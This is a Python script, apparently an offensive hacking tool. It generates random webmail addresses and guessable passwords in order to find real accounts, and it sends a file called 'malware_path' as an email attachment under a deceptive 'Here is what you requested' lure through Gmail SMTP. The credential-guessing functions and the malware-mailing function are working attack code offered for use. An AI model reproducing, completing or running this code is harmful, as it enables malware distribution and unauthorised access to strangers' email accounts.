import random
import names
from random_username.generate import generate_username
from colorama import Fore, Style
import colorama
import smtplib
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart 
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText
from email import encoders 
import os
import ssl

""""
=============================================================================================
Random Email and Random password generation 
with the hope to find discover new Email accounts.

for example, create a random email like bob8721@gmail.com and password bob1234 
there is a 50% change that the email + password is real.
if it is, It's saved, If not, Keep generating random email:creds
"""

def random_email(username_also = False):
    """ 
    Return a random email
    """
    random_numbers = str(random.randrange(0, 5000))
    random_years = str(random.randrange(1833, 2050)) # 1833 when computer was invented (ABACUS)
    name_full = names.get_full_name()
    name_first = names.get_first_name()
    name_last = names.get_last_name()

    if(username_also == True):
        prefix = random.choice([name_full.replace(" ", ""), name_first, name_last])
        two = prefix.lower() + str(random.randrange(0, 500))  # Random Name + number 
        three = generate_username(1)[0] + random_numbers # Random Username + random_number
        four = generate_username(1)[0] + random_years # Random Username + Random Years 
        five = prefix.lower() # Random name only
        six = prefix.lower() + str(random.randrange(0, 500)) # Random name + Random number 0 to 500
        seven = generate_username(1)[0] + random_numbers # random Username + random number 
        eight = generate_username(1)[0] + random_years # Random Username + random year
        FINAL_EMAIL = random.choice([
        two,
        three,
        four,
        five,
        six,
        seven,
        eight])
    else:
        service = ["@gmail.com", "@yahoo.com", "@protonmail.com", "@outlook.com", "@yandex.com"]
        prefix = random.choice([name_full.replace(" ", ""), name_first, name_last])
        email_service = random.choice([service[0], service[1], service[2], service[3], service[4]])

        mail_one = prefix.lower() + email_service
        mail_two = prefix.lower() + str(random.randrange(0, 500)) + email_service
        mail_three = generate_username(1)[0] + random_numbers + email_service
        mail_four = generate_username(1)[0] + random_years + email_service
        FINAL_EMAIL = random.choice([mail_one, mail_two, mail_three, mail_four])
        
    return FINAL_EMAIL, prefix.lower()
    
def random_password(username):
    """
    Return a random password
    """
    random_numbers = str(random.randrange(0, 500))

    return username + random_numbers


""""
=============================================================================================
"""

def send_mail(my_addr, my_pass, addr, malware_path):

    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "\n[+] Sending Email to : " + addr)
    context = ssl.create_default_context()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls(context=context)
    server.ehlo()
    try:
        server.login(my_addr, my_pass)
    except smtplib.SMTPAuthenticationError:
        print(Style.BRIGHT + Fore.RED + "[X] Email or Password Incorrect. (SMTPAuthenticationError)" + Style.RESET_ALL)
        exit(1)
    except Exception as er:
        print(Style.BRIGHT + Fore.RED + "[X] " + str(er) + Style.RESET_ALL)
        exit(1)

    msg = MIMEMultipart()
    txt = "The file u requested."

    msg['Subject'] = 'Here is what you requested.'
    msg['From'] = my_addr
    msg['To'] = addr
    msg.attach(MIMEText(txt))

    with open(malware_path, "rb") as attach:
        p = MIMEApplication(
            attach.read(),
            Name=os.path.basename(malware_path)
        ) 
        p['Content-Disposition'] = 'attachment; filename="%s"' % os.path.basename(malware_path)
        
    msg.attach(p)

    try:
        server.send_message(msg)
        print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[+] Email Sent to : " + addr + Style.RESET_ALL)
    except Exception as E:
        print(Style.BRIGHT + Fore.RED + "[X] Error Sending mail " + str(E) + Style.RESET_ALL)

    server.quit()

def BANNER():
    colorama.init()
    banner = Style.BRIGHT + Fore.LIGHTGREEN_EX + """
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^%      (^^^^^^)       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                      /^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^#                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^,                                   ^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^,                                             ^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^*                                                       ^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^         /^^^^^^^^^^^^^^^^^/         ^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^     /^^^^^    *^^^^^^^^^^^/     ^^^^(     ^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^#   &^^^^^^^^^^,   ^^^^^^^^^   ^^^^^^^^^^^&   (^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^*             ,^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^/   /^^^^^/   /^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^*   ^^^^^^^^^^^(   ^^^^^^^^^   (^^^^^^^^^^^   ,^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^     ^^^^^^     ^^^^^^^^^^^     &^^^^^^    ^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^#          ^^^^^^^^^^^^^^^^^          (^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

""" + Style.RESET_ALL

    return banner